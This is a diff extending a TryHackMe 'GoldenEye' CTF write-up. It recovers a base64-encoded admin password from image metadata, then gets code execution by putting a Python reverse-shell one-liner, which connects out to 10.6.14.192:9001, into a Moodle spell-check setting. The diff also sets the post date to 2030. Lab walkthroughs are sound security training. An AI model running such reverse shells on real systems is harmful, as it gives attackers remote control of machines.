@@ -1,7 +1,7 @@
 ---
 title: "TryHackMe (THM) - GoldenEye"
 description: "?"
-date: 2024-10-15 12:00:00 -100
+date: 2030-10-15 12:00:00 -100
 image: /assets/images/THM - GoldenEye/GoldenEye Thumbnail.png
 categories: [CTF]
 tags: [test]    # TAG names should always be lowercase
@@ -133,9 +133,47 @@ Going into doaks emails, we retrieve a message telling us to login to the traini
 userrname: `dr_doak`
 password: `4England!`
 
-Logging into the training site as dr_doak, we see that there's a file
-
 ![Secret File](/assets/images/THM%20-%20GoldenEye/secret%20file.png)
 
+Logging into the training site as dr_doak, we see that there's a file
 
+![Note](/assets/images/Other/Note.png)
+
+The note explains that admin credentials were captured in clear-text as well as mentioning that ***something juicy*** is located at `/dir007key/for-007.jpg`
+
+Let's navigate to that directory
+
+![Secret Directory](/assets/images/THM%20-%20GoldenEye/Secret%20Directory.png)
+
+Let's download this picture and run `exiftool` on it to extract the metadata
+
+![Metadata](/assets/images/THM%20-%20GoldenEye/Metadata.png)
+
+This string for Image Description appears to be base64. Let's decode this.
+
+```bash
+echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
+```
+
+![Decoded](/assets/images/THM%20-%20GoldenEye/Decoded.png)
+
+We discover that the admin password is `xWinter1995x!`
+
+Let's login as admin
+
+![Admin Settings](/assets/images/THM%20-%20GoldenEye/System%20Admin%20Settings.png)
+
+We see that we have access to some admin settings
+
+![Path to injection](/assets/images/THM%20-%20GoldenEye/Injection.png)
+
+Let's try editing this command to be a reverse shell
+
+```input
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.14.192",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+Now we have to set the "spell engine" part to PSpellShell in the TinyMCE editor to trigger the payload
+
+![Settings](/assets/images/THM%20-%20GoldenEye/Spell%20Engine.png)
 
